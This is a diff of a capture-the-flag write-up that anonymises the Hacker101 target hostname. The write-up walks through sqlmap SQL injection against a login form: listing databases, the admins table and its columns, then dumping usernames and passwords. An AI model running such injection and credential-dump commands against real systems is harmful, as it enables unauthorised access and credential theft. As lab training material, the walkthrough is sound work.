@@ -17,7 +17,7 @@ Im getting this message:
 
 Im gonna try and increase de level value to 2
 
-`sqlmap -u "https://bf6d320adcbbe56841eb0d43a6a79866.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST --dbs --level 2`
+`sqlmap -u "https:/{HEX_VALUE_HERE}.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST --dbs --level 2`
 
 Looks like im getting more juice this time!
 
@@ -32,19 +32,19 @@ Im getting this message as well, im gonna go ahead and try to vulnerate only the
 
 Finally got some results! I got all the databases, im gonna take a look into level2 database
 
-`sqlmap -u "https://bf6d320adcbbe56841eb0d43a6a79866.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 --tables`
+`sqlmap -u "https://{HEX_VALUE_HERE}.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 --tables`
 
 Lets get into admins table and see its columns
 
-`qlmap -u "https://bf6d320adcbbe56841eb0d43a6a79866.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 -T admins --columns`
+`qlmap -u "https:/{HEX_VALUE_HERE}.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 -T admins --columns`
 
 Now lets have a look into the usernames! Dump it!
 
-`qlmap -u "https://bf6d320adcbbe56841eb0d43a6a79866.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 -T admins -C username --dump`
+`qlmap -u "https://{HEX_VALUE_HERE}.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 -T admins -C username --dump`
 
 Now lets retrieve the pass
 
-`sqlmap -u "https://bf6d320adcbbe56841eb0d43a6a79866.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 -T admins -C password --dump`
+`sqlmap -u "https://{HEX_VALUE_HERE}.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 -T admins -C password --dump`
 
 Now lets try log in. Got it! We have the last flag
 
